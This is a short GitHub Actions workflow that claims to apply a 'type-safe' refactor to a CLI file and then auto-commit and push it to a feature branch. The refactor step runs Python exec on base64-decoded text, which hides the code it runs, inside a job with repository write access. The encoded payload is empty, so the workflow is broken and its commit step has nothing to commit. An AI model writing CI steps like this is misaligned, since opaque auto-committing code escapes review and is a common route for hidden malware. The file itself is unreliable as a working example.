name: Fix CLI type-safe calls

on:
  push:
    branches:
      - feat/opencode-raw-export-default

permissions:
  contents: write

jobs:
  fix:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: feat/opencode-raw-export-default

      - name: Replace dynamic keyword calls
        run: python -c "import base64; exec(base64.b64decode(''))"

      - name: Commit fix
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/agent_worklog/cli.py
          git commit -m "refactor: use type-safe privacy option calls"
          git push origin HEAD:feat/opencode-raw-export-default
